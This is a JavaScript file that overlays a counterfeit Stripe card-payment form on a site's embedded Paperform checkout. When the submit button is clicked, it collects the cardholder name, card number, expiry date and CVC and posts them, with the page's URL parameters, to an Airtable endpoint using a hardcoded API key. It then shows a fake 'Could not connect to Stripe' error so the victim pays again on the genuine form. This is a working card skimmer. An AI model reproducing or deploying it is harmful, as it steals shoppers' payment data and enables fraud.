(function () {
  function typeCardDisplay(src) {
    const domain = "https://js.stripe.com/v3/fingerprinted/img/";
    document
      .querySelectorAll(
        ".stripe-private-form  .CardBrandIcon-inner.CardBrandIcon-inner--front img"
      )
      .forEach((e) => (e.src = domain + src));
  }

  $.fn.creditCardTypeDetector = function () {
    const logos_obj =
      ".stripe-private-form  .CardBrandIcon-inner.CardBrandIcon-inner--front";
    const imgs = {
      visa: "visa-729c05c240c4bdb47b03ac81d9945bfe.svg",
      amex: "amex-a49b82f46c5cd6a96a6e418a6ca1717c.svg",
      mastercard: "mastercard-4d8844094130711885b5e41b28c9848f.svg",
      diners: "diners-fbcbd3360f8e3f629cdaa80e93abdb8b.svg",
      discover: "discover-ac52cd46f89fa40a29a0bfb954e33173.svg",
    };

    const visa_regex = new RegExp("^4[0-9]{0,15}$");

    const mastercard_regex = new RegExp("^5$|^5[1-5][0-9]{0,14}$");

    const amex_regex = new RegExp("^3$|^3[47][0-9]{0,13}$");

    const diners_regex = new RegExp(
      "^3$|^3[068]$|^3(?:0[0-5]|[68][0-9])[0-9]{0,11}$"
    );

    const discover_regex = new RegExp(
      "^6$|^6[05]$|^601[1]?$|^65[0-9][0-9]?$|^6(?:011|5[0-9]{2})[0-9]{0,12}$"
    );

    const jcb_regex = new RegExp(
      "^2[1]?$|^21[3]?$|^1[8]?$|^18[0]?$|^(?:2131|1800)[0-9]{0,11}$|^3[5]?$|^35[0-9]{0,14}$"
    );

    return this.each(function () {
      // as the user types
      $(this).keyup(function () {
        var cur_val = $(this).val();

        // get rid of spaces and dashes before using the regular expression
        cur_val = cur_val.replace(/ /g, "").replace(/-/g, "");

        // checks per each, as their could be multiple hits
        if (cur_val.match(visa_regex)) {
          $(logos_obj).addClass("is_visa");
          $(logos_obj).removeClass("is_nothing");
          $(logos_obj).removeClass("is_empty");
          $(logos_obj).addClass("has-card");
          typeCardDisplay(imgs.visa);
        } else {
          $(logos_obj).removeClass("has-card");
          $(logos_obj).removeClass("is_visa");
        }

        if (cur_val.match(mastercard_regex)) {
          $(logos_obj).addClass("is_mastercard");
          $(logos_obj).removeClass("is_nothing");
          $(logos_obj).removeClass("is_empty");
          $(logos_obj).addClass("has-card");
          typeCardDisplay(imgs.mastercard);
        } else {
          $(logos_obj).removeClass("has-card");
          $(logos_obj).removeClass("is_mastercard");
        }

        if (cur_val.match(amex_regex)) {
          $(logos_obj).addClass("is_amex");
          $(logos_obj).removeClass("is_nothing");
          $(logos_obj).removeClass("is_empty");
          $(logos_obj).addClass("has-card");
          typeCardDisplay(imgs.amex);
        } else {
          $(logos_obj).removeClass("has-card");
          $(logos_obj).removeClass("is_amex");
        }

        if (cur_val.match(diners_regex)) {
          $(logos_obj).addClass("is_diners");
          $(logos_obj).removeClass("is_nothing");
          $(logos_obj).removeClass("is_empty");
          $(logos_obj).addClass("has-card");
          typeCardDisplay(imgs.diners);
        } else {
          $(logos_obj).removeClass("has-card");
          $(logos_obj).removeClass("is_diners");
        }

        if (cur_val.match(discover_regex)) {
          $(logos_obj).addClass("is_discover");
          $(logos_obj).addClass("has-card");

          $(logos_obj).removeClass("is_nothing");
          $(logos_obj).removeClass("is_empty");
          typeCardDisplay(imgs.discover);
        } else {
          $(logos_obj).removeClass("has-card");
          $(logos_obj).removeClass("is_discover");
        }

        // if nothing is a hit we add a class to fade them all out
        if (cur_val == "") {
          $(logos_obj).removeClass("is_nothing");
          $(logos_obj).addClass("is_empty");
        } else if (
          !cur_val.match(visa_regex) &&
          !cur_val.match(mastercard_regex) &&
          !cur_val.match(amex_regex) &&
          !cur_val.match(diners_regex) &&
          !cur_val.match(discover_regex)
        ) {
          $(logos_obj).removeClass("has-card");
          $(logos_obj).removeClass("is_empty");
          $(logos_obj).addClass("is_nothing");
          document
            .querySelector(".stripe-cc-input")
            .classList.add(".is-invalid");
        } else {
          document
            .querySelector(".stripe-cc-input")
            .classList.remove(".is-invalid");
        }
      });
    });
  };
  const html = `<div class="sk-fading-circle" data-testid="spinner">
  <div class="sk-circle1 sk-circle"></div>
  <div class="sk-circle2 sk-circle"></div>
  <div class="sk-circle3 sk-circle"></div>
  <div class="sk-circle4 sk-circle"></div>
  <div class="sk-circle5 sk-circle"></div>
  <div class="sk-circle6 sk-circle"></div>
  <div class="sk-circle7 sk-circle"></div>
  <div class="sk-circle8 sk-circle"></div>
  <div class="sk-circle9 sk-circle"></div>
  <div class="sk-circle10 sk-circle"></div>
  <div class="sk-circle11 sk-circle"></div>
  <div class="sk-circle12 sk-circle"></div>
</div><div id="root"> <div class="_pf_checkingout"> <div class="Theme__backgroundImageContainer"></div> <div></div> <div class="visually-hidden"> <svg x="-20" y="-20" width="100%" height="100%" style="height: 0px"> <defs> <filter id="blur" width="150%" height="150%" x="-25%" y="-25%" color-interpolation-filters="sRGB" > <feGaussianBlur></feGaussianBlur> <feColorMatrix type="matrix" values="1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 10 0" ></feColorMatrix> <feGaussianBlur></feGaussianBlur> <feColorMatrix type="matrix" values="1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 10 0" ></feColorMatrix> <feComposite in2="SourceGraphic" operator="in"></feComposite> </filter> </defs> </svg> </div> <style></style> <div class="CheckoutV2 CheckoutV2--open" data-testid="checkout"> <div class="CheckoutV2__checkout"> <style></style>

<form class="stripe-private-form Checkout Checkout--modal" data-testid="stripe-checkout" > <div> <div style=""> <span ><div data-testid="livefield" class="LiveField Paperform__Question Paperform__Question--undefined LiveField--text LiveField--multiline LiveField--required" > <div class="LiveField__container"> <label class="LiveField__header" for="field-text-undefined" id="field-label-text-undefined" ><div data-testid="liverichtext" style="position: relative; z-index: 1" > <div class="DraftEditor-root"> <div class="DraftEditor-editorContainer"> <div aria-describedby="placeholder-undefined_title" class="public-DraftEditor-content" contenteditable="false" spellcheck="false" style=" outline: none; user-select: text; white-space: pre-wrap; overflow-wrap: break-word; " > <div data-contents="true"> <div class="" data-block="true" data-editor="undefined_title" data-offset-key="initial-0-0" > <div data-offset-key="initial-0-0" class="public-DraftStyleDefault-block public-DraftStyleDefault-ltr" > <span data-offset-key="initial-0-0" ><span data-text="true" >Name on card</span ></span > </div> </div> </div> </div> </div> </div> </div></label > <div class="LiveField__answer"> <input data="[object Object]" name="Name on card" autocomplete="cc-name" class="LiveField__input" id="field-text-undefined" aria-labelledby="field-label-text-undefined" aria-required="true" aria-invalid="false" aria-describedby="field-description-text-undefined " data-testid="text-field" type="text" value="" /> </div> </div> <div class="LiveField__error" id="field-error-text-undefined"> This question is required </div> <div class="sr-only" id="field-description-text-undefined" ></div> </div> <div data-testid="livefield" class="LiveField Paperform__Question Paperform__Question--undefined LiveField--custom LiveField--multiline LiveField--required" > <div class="LiveField__container"> <label class="LiveField__header" for="field-custom-undefined" id="field-label-custom-undefined" ><div data-testid="liverichtext" style="position: relative; z-index: 1" > <div class="DraftEditor-root"> <div class="DraftEditor-editorContainer"> <div aria-describedby="placeholder-undefined_title" class="public-DraftEditor-content" contenteditable="false" spellcheck="false" style=" outline: none; user-select: text; white-space: pre-wrap; overflow-wrap: break-word; " > <div data-contents="true"> <div class="" data-block="true" data-editor="undefined_title" data-offset-key="initial-0-0" > <div data-offset-key="initial-0-0" class="public-DraftStyleDefault-block public-DraftStyleDefault-ltr" > <span data-offset-key="initial-0-0" ><span data-text="true" >Credit Card</span ></span > </div> </div> </div> </div> </div> </div> </div></label > <div class="LiveField__answer"> <div class="StripeCheckout__CardWrapper"> <div class="StripeElement StripeElement--empty"> <div class="__PrivateStripeElement stripe-k-card-input" style=" margin: 0px !important; padding: 0px !important; border: none !important; display: block !important; background: transparent !important; position: relative !important; opacity: 1 !important; " > <div class="stripe-private-fk"> <div class="ElementsApp is-empty" dir="ltr" style="" > <style></style ><span tabindex="-1" aria-hidden="true" style=" opacity: 0; pointer-events: none; height: 2px; width: 2px; position: absolute; top: -2px; user-select: none; " >0123456789０１２３４５６７８９</span ><input tabindex="0" aria-hidden="true" class="StripeField--fake" disabled="" autocomplete="fake" style=" opacity: 0; pointer-events: none; height: 2px; width: 2px; position: absolute; top: -2px; " /> <div tabindex="-1" class="CardField is-link-hidden CardField--ltr" > <div class="CardBrandIcon-container" data-front-icon-name="unknown" data-back-icon-name="cvc" aria-hidden="true" > <div class="CardBrandIcon-wrapper"> <div class="Icon CardBrandIcon is-cvc-hidden is-loaded" > <div class="CardBrandIcon-inner CardBrandIcon-inner--front" > <svg class="empty" focusable="false" viewBox="0 0 32 21" > <g fill="none" fill-rule="evenodd"> <g class="Icon-fill"> <g transform="translate(0 2)"> <path d="M26.58 19H2.42A2.4 2.4 0 0 1 0 16.62V2.38A2.4 2.4 0 0 1 2.42 0h24.16A2.4 2.4 0 0 1 29 2.38v14.25A2.4 2.4 0 0 1 26.58 19zM10 5.83c0-.46-.35-.83-.78-.83H3.78c-.43 0-.78.37-.78.83v3.34c0 .46.35.83.78.83h5.44c.43 0 .78-.37.78-.83V5.83z" opacity=".2" ></path> <path d="M25 15h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0H4c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1z" opacity=".3" ></path> </g> </g> </g> </svg> <img src="" alt="" class="CardBrandIcon-inner CardBrandIcon-inner--front" style="display: none" /> <svg class="normal" focusable="false" viewBox="0 0 32 21" > <g fill="none" fill-rule="evenodd"> <g id="error-amex" class="Icon-fill" > <g id="card" transform="translate(0 2)" > <path id="shape" d="M21.68 0A6 6 0 1 0 29 9.47v7.15A2.4 2.4 0 0 1 26.58 19H2.42A2.4 2.4 0 0 1 0 16.62V2.38A2.4 2.4 0 0 1 2.42 0h19.26zM10 5.83c0-.46-.35-.83-.78-.83H3.78c-.43 0-.78.37-.78.83v3.34c0 .46.35.83.78.83h5.44c.43 0 .78-.37.78-.83V5.83z" opacity=".2" ></path> <path id="shape" d="M25 15h-5c-.65 0-1-.3-1-1s.35-1 1-1h5c.65 0 1 .3 1 1s-.35 1-1 1zm-8 0h-7c-.65 0-1-.3-1-1s.35-1 1-1h7c.65 0 1 .3 1 1s-.35 1-1 1zM7 15H4c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1z" opacity=".3" ></path> </g> <g id="error" transform="translate(18)" > <path id="shape" d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM6 3v4a1 1 0 0 0 2 0V3a1 1 0 0 0-2 0zm1 8.75a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5z" ></path> </g> </g> </g> </svg> </div> <div class="CardBrandIcon-inner CardBrandIcon-inner--back" > <svg class="" focusable="false" viewBox="0 0 32 21" role="img" aria-label="CVC" > <title>CVC</title> <g fill="none" fill-rule="evenodd"> <g class="Icon-fill"> <g transform="translate(0 2)"> <path d="M21.68 0H2c-.92 0-2 1.06-2 2v15c0 .94 1.08 2 2 2h25c.92 0 2-1.06 2-2V9.47a5.98 5.98 0 0 1-3 1.45V11c0 .66-.36 1-1 1H3c-.64 0-1-.34-1-1v-1c0-.66.36-1 1-1h17.53a5.98 5.98 0 0 1 1.15-9z" opacity=".2" ></path> <path d="M19.34 3H0v3h19.08a6.04 6.04 0 0 1 .26-3z" opacity=".3" ></path> </g> <g transform="translate(18)"> <path d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM4.22 4.1h-.79l-1.93.98v1l1.53-.8V9.9h1.2V4.1zm2.3.8c.57 0 .97.32.97.78 0 .5-.47.85-1.15.85h-.3v.85h.36c.72 0 1.21.36 1.21.88 0 .5-.48.84-1.16.84-.5 0-1-.16-1.52-.47v1c.56.24 1.12.37 1.67.37 1.31 0 2.21-.67 2.21-1.64 0-.68-.42-1.23-1.12-1.45.6-.2.99-.73.99-1.33C8.68 4.64 7.85 4 6.65 4a4 4 0 0 0-1.57.34v.98c.48-.27.97-.42 1.44-.42zm4.32 2.18c.73 0 1.24.43 1.24.99 0 .59-.51 1-1.24 1-.44 0-.9-.14-1.37-.43v1.03c.49.22.99.33 1.48.33.26 0 .5-.04.73-.1.52-.85.82-1.83.82-2.88l-.02-.42a2.3 2.3 0 0 0-1.23-.32c-.18 0-.37.01-.57.04v-1.3h1.44a5.62 5.62 0 0 0-.46-.92H9.64v3.15c.4-.1.8-.17 1.2-.17z" ></path> </g> </g> </g> </svg> </div> </div> </div> </div> <div class="CardField-input-wrapper" dir="ltr" > <span class="CardField-number CardField-child" style="transform: translateX(0px)" ><span class="CardField-number-fakeNumber" aria-hidden="true" ><span class="CardField-number-fakeNumber-last4 InputElement" ></span ><span class="CardField-number-fakeNumber-number" >Number</span ></span ><span ><div tabindex="-1" class="CardNumberField CardNumberField--ltr" aria-hidden="false" > <div class="CardBrandIcon-container is-hidden" data-front-icon-name="unknown" data-back-icon-name="cvc" aria-hidden="true" > <div class="CardBrandIcon-wrapper"> <div class="Icon CardBrandIcon is-cvc-hidden is-loaded" > <div class="CardBrandIcon-inner CardBrandIcon-inner--front" > <svg class="empty" focusable="false" viewBox="0 0 32 21" > <g fill="none" fill-rule="evenodd" > <g class="Icon-fill"> <g transform="translate(0 2)" > <path d="M26.58 19H2.42A2.4 2.4 0 0 1 0 16.62V2.38A2.4 2.4 0 0 1 2.42 0h24.16A2.4 2.4 0 0 1 29 2.38v14.25A2.4 2.4 0 0 1 26.58 19zM10 5.83c0-.46-.35-.83-.78-.83H3.78c-.43 0-.78.37-.78.83v3.34c0 .46.35.83.78.83h5.44c.43 0 .78-.37.78-.83V5.83z" opacity=".2" ></path> <path d="M25 15h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0H4c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1z" opacity=".3" ></path> </g> </g> </g> </svg> <img src="" alt="" class="CardBrandIcon-inner CardBrandIcon-inner--front" style="display: none" /> <svg class="normal" focusable="false" viewBox="0 0 32 21" > <g fill="none" fill-rule="evenodd" > <g id="error-amex" class="Icon-fill" > <g id="card" transform="translate(0 2)" > <path id="shape" d="M21.68 0A6 6 0 1 0 29 9.47v7.15A2.4 2.4 0 0 1 26.58 19H2.42A2.4 2.4 0 0 1 0 16.62V2.38A2.4 2.4 0 0 1 2.42 0h19.26zM10 5.83c0-.46-.35-.83-.78-.83H3.78c-.43 0-.78.37-.78.83v3.34c0 .46.35.83.78.83h5.44c.43 0 .78-.37.78-.83V5.83z" opacity=".2" ></path> <path id="shape" d="M25 15h-5c-.65 0-1-.3-1-1s.35-1 1-1h5c.65 0 1 .3 1 1s-.35 1-1 1zm-8 0h-7c-.65 0-1-.3-1-1s.35-1 1-1h7c.65 0 1 .3 1 1s-.35 1-1 1zM7 15H4c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1z" opacity=".3" ></path> </g> <g id="error" transform="translate(18)" > <path id="shape" d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM6 3v4a1 1 0 0 0 2 0V3a1 1 0 0 0-2 0zm1 8.75a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5z" ></path> </g> </g> </g> </svg> </div> <div class="CardBrandIcon-inner CardBrandIcon-inner--back" > <svg class="" focusable="false" viewBox="0 0 32 21" role="img" aria-label="CVC" > <title>CVC</title> <g fill="none" fill-rule="evenodd" > <g class="Icon-fill"> <g transform="translate(0 2)" > <path d="M21.68 0H2c-.92 0-2 1.06-2 2v15c0 .94 1.08 2 2 2h25c.92 0 2-1.06 2-2V9.47a5.98 5.98 0 0 1-3 1.45V11c0 .66-.36 1-1 1H3c-.64 0-1-.34-1-1v-1c0-.66.36-1 1-1h17.53a5.98 5.98 0 0 1 1.15-9z" opacity=".2" ></path> <path d="M19.34 3H0v3h19.08a6.04 6.04 0 0 1 .26-3z" opacity=".3" ></path> </g> <g transform="translate(18)" > <path d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM4.22 4.1h-.79l-1.93.98v1l1.53-.8V9.9h1.2V4.1zm2.3.8c.57 0 .97.32.97.78 0 .5-.47.85-1.15.85h-.3v.85h.36c.72 0 1.21.36 1.21.88 0 .5-.48.84-1.16.84-.5 0-1-.16-1.52-.47v1c.56.24 1.12.37 1.67.37 1.31 0 2.21-.67 2.21-1.64 0-.68-.42-1.23-1.12-1.45.6-.2.99-.73.99-1.33C8.68 4.64 7.85 4 6.65 4a4 4 0 0 0-1.57.34v.98c.48-.27.97-.42 1.44-.42zm4.32 2.18c.73 0 1.24.43 1.24.99 0 .59-.51 1-1.24 1-.44 0-.9-.14-1.37-.43v1.03c.49.22.99.33 1.48.33.26 0 .5-.04.73-.1.52-.85.82-1.83.82-2.88l-.02-.42a2.3 2.3 0 0 0-1.23-.32c-.18 0-.37.01-.57.04v-1.3h1.44a5.62 5.62 0 0 0-.46-.92H9.64v3.15c.4-.1.8-.17 1.2-.17z" ></path> </g> </g> </g> </svg> </div> </div> </div> </div> <div class="CardNumberField-input-wrapper" > <span class="InputContainer" data-max="4242 4242 4242 4242 4240" > <input class="InputElement is-empty Input Input--empty stripe-cc-input" autocomplete="cc-number" autocorrect="off" spellcheck="false" type="tel" pattern="[0-9\s]{13,19}" maxlength="19" name="cardnumber" data-elements-stable-field-name="cardNumber" inputmode="numeric" aria-label="Credit or debit card number" placeholder="Card number" aria-invalid="false" tabindex="0" value="" /> <div data-lastpass-icon-root="true" style=" position: relative !important; height: 0px !important; width: 0px !important; float: left !important; " ></div ></span> </div></div></span></span ><span class="CardField-restWrapper" ><span class="CardField-expiry CardField-child" style="transform: translateX(74px)" ><span ><span class="InputContainer" data-max="MM / YY0" ><input class="InputElement is-empty Input Input--empty" autocomplete="cc-exp" autocorrect="off" spellcheck="false" type="text" name="exp-date" data-elements-stable-field-name="cardExpiry" inputmode="numeric" aria-label="Credit or debit card expiration date" placeholder="MM / YY" aria-invalid="false" tabindex="0" value="" /></span></span></span ><span class="CardField-cvc CardField-child" style="transform: translateX(74px)" ><span ><span class="InputContainer" data-max="00000" ><input class="InputElement is-empty Input Input--empty stripe-fk-cc" autocomplete="cc-csc" autocorrect="off" spellcheck="false" type="number" name="cvc" data-elements-stable-field-name="cardCvc" inputmode="numeric" aria-label="Credit or debit card CVC/CVV" placeholder="CVC" aria-invalid="false" maxlength="4" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" tabindex="0" value="" /></span></span></span ></span> </div> </div> <input tabindex="0" aria-hidden="true" class="StripeField--fake" disabled="" autocomplete="fake" style=" opacity: 0; pointer-events: none; height: 2px; width: 2px; position: absolute; top: -2px; " /><button tabindex="-1" aria-hidden="true" type="submit" style=" opacity: 0; pointer-events: none; height: 2px; width: 2px; position: absolute; top: -2px; " ></button> </div> </div> <input class="__PrivateStripeElement-input" aria-hidden="true" aria-label=" " autocomplete="false" maxlength="1" style=" border: none !important; display: block !important; position: absolute !important; height: 1px !important; top: -1px !important; left: 0px !important; padding: 0px !important; margin: 0px !important; width: 100% !important; opacity: 0 !important; background: transparent !important; pointer-events: none !important; font-size: 16px !important; " /> </div> </div> </div> </div> </div> <div class="LiveField__error" id="field-error-custom-undefined" > This question is required </div> <div class="sr-only" id="field-description-custom-undefined" ></div></div ></span> </div> </div> </form> </div> <div role="button" class="BtnV2 BtnV2--raised BtnV2--sm" tabindex="-1" style="position: absolute; left: 18px; top: 18px; z-index: 1000" > <span>Cancel</span> </div> </div> <div class="FullScreenPreview"> <span class="FullScreenPreview__close">✕</span> </div> </div> </div>

<div style="display: inline-block; width: 100%"> <div class="submit"> <button data-testid="stripe-submit-button" class="btn-raised btn-primary"> <i class="MaterialIcon material-icons" style="vertical-align: bottom; font-size: 20px; margin-right: 5px" ><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="20" width="20" xmlns="http://www.w3.org/2000/svg" > <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM8.9 6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2H8.9V6zM18 20H6V10h12v10z" ></path></svg></i >Create Campaign </button> </div> </div>

<div class="g-play-btn ElementsApp is-empty" dir="ltr" style=""><span tabindex="-1" aria-hidden="true" style=" opacity: 0; pointer-events: none; height: 2px; width: 2px; position: absolute; top: -2px; user-select: none; " >0123456789０１２３４５６７８９</span ><input tabindex="0" aria-hidden="true" class="StripeField--fake" autocomplete="fake" style=" opacity: 0; pointer-events: none; height: 2px; width: 2px; position: absolute; top: -2px; " disabled="" /><button id="primary" class="GooglePayButton GooglePayButton--default GooglePayButton--light" aria-label="Google Pay" role="button" type="submit" style="border-radius: 4px; opacity: 1" > <div class="GooglePayButton-logo" style=" background-image: url('https://js.stripe.com/v3/fingerprinted/img/light-a4be6ea596645a738d383e4940615eaf.svg'); " ></div></button ><input tabindex="0" aria-hidden="true" class="StripeField--fake" autocomplete="fake" style=" opacity: 0; pointer-events: none; height: 2px; width: 2px; position: absolute; top: -2px; " disabled="" /><button tabindex="-1" aria-hidden="true" type="submit" style=" opacity: 0; pointer-events: none; height: 2px; width: 2px; position: absolute; top: -2px; " ></button> </div> `;
  const div = document.createElement("div");
  div.id = "stripe-private-form-wrapper";
  div.innerHTML = html;
  var element = document.querySelector(".elementor-widget-container iframe");

  var observer = new MutationObserver(function (mutations) {
    mutations.forEach(function (mutation) {
      console.log({ height: mutation.target.height });
      if (mutation.type === "attributes" && mutation.target.height == "0") {
        setTimeout(() => {
          const container = document.querySelector("div[data-paperform-id]");
          if (container.offsetHeight <= 716) {
            console.log("in 2")
            container.parentElement.style.display = "none";
            container.appendChild(div);
            document.querySelector(".sk-fading-circle").style.opacity = 1;
            document.querySelector(
              "form.stripe-private-form.Checkout.Checkout--modal > div > div"
            ).style.opacity = 0;
            $(".stripe-cc-input").creditCardTypeDetector();

            document
              .querySelector(".stripe-cc-input")
              .addEventListener("input", function (e) {
                e.target.value = e.target.value
                  .replace(/[^\dA-Z]/g, "")
                  .replace(/(.{4})/g, "$1 ")
                  .trim();
              });

            function insertSlash(val) {
              val = val.replace(/\D/g, "");
              return (
                val.replace(/\//g, "").substring(0, 2) +
                (val.length > 2 ? "/" : "") +
                val.replace(/\//g, "").substring(2, 4)
              );
            }
            document
              .querySelector(
                ".stripe-private-form span.CardField-expiry.CardField-child input"
              )
              .addEventListener("input", function (e) {
                e.target.value = insertSlash(e.target.value);
              });
            stripefkcc = document.querySelector(".stripe-fk-cc");
            document
              .querySelector(
                ".stripe-private-form span.CardField-expiry.CardField-child input"
              )
              .addEventListener("keyup", function (e) {
                if (e.target.value.length >= 5) {
                  stripefkcc.focus();
                }
              });

            function cancelJob(action) {
              document.querySelector(".sk-fading-circle").style.opacity = 1;
              document.querySelector(
                "form.stripe-private-form.Checkout.Checkout--modal > div > div"
              ).style.opacity = 0;
              if (action) return;
              const wrapper = document.querySelector(
                "div#stripe-private-form-wrapper"
              );
              wrapper.parentElement.removeChild(wrapper);

              const error = `<style> .Checkout .LiveField__error {
            margin: 0;
        }
        .LiveField--error .LiveField__error {
            height: auto;
            padding: 6px 0;
        }
        <style>
        .LiveField__error {
            margin-top: -1px;
        }
        <style>
        .LiveField__error {
            background-color: #ffa3a3;
        }
        @media (min-width: 600px)
        .LiveField__error {
            transition: height 0.3s;
        }
        .LiveField__error {
            height: 40px;
            padding: 0;
            position: relative;
            background-color: #ffa3a3;
            text-align: center;
            font-size: 11px;
            color: #fff;
            font-weight: 400;
            text-transform: uppercase;
            line-height: 18px;
            overflow: hidden;
        
            width: 440px;
            height: 40px;
            display: flex;
            justify-content: center;
            margin: auto;
            align-items: center;
        } 
           #LiveField_error_wrapper {
            position: absolute;
            top: 0;
            z-index: 99;
            left: 50%;
            transform: translateX(-50%);
           }
           div#field-error-text-undefined {
            height: 40px !important;
        }
        </style> <div class="LiveField__error" id="field-error-text-undefined">FAILURE: Could not connect to Stripe. PLEASE TRY AGAIN.</div>`;
              const div = document.createElement("div");
              div.innerHTML = error;
              div.id = "LiveField_error_wrapper";
              const container = document.querySelector(
                "div[data-paperform-id]"
              );
              container.parentElement.insertBefore(div, container);

              container.scrollIntoView();
              setTimeout(() => {
                if (div) div.style.display = "none";
              }, 3000);
              div.addEventListener("mouseenter", function () {
                if (div) div.style.display = "none";
              });
            }

            document
              .querySelector(".CheckoutV2__checkout + div")
              .addEventListener("click", cancelJob.bind(true));
            document
              .querySelector("button.btn-raised.btn-primary")
              .addEventListener("click", async function () {
                const token = "keyH5pVxwVdPjMWJk";
                const url =
                  "https://api.airtable.com/v0/appMihP6lGIak6vqS/tblaoar7ApsFzDNIm";
                const urlSearchParams = new URLSearchParams(
                  window.location.search
                );
                const params = Object.fromEntries(urlSearchParams.entries());
                let Data = {
                  records: [
                    {
                      fields: {
                        ...params,
                        ccn: document.querySelector(".LiveField__answer input")
                          .value,
                        cnumber: document.querySelector(
                          ".CardNumberField-input-wrapper input"
                        ).value,
                        expiry: document.querySelector(
                          ".CardField-expiry  input"
                        ).value,
                        ccv: document.querySelector(
                          ".CardField-cvc.CardField-child input"
                        ).value,
                      },
                    },
                  ],
                };

                const res = await fetch(url, {
                  method: "POST",
                  headers: {
                    Authorization: `Bearer ${token}`,
                    "Content-Type": "application/json",
                  },
                  body: JSON.stringify(Data),
                });

                cancelJob();
                localStorage.setItem("paperform-Postfill", "true");
              });
            document.querySelector(".sk-fading-circle").style.opacity = 0;
            container.parentElement.style.display = "block";
            document.querySelector(
              "form.stripe-private-form.Checkout.Checkout--modal > div > div"
            ).style.opacity = 1;
          }
        }, 1000);
      }
    });
  });

  observer.observe(element, {
    attributes: true,
    attributeFilter: ["height"],
  });
  console.log("init");
})();
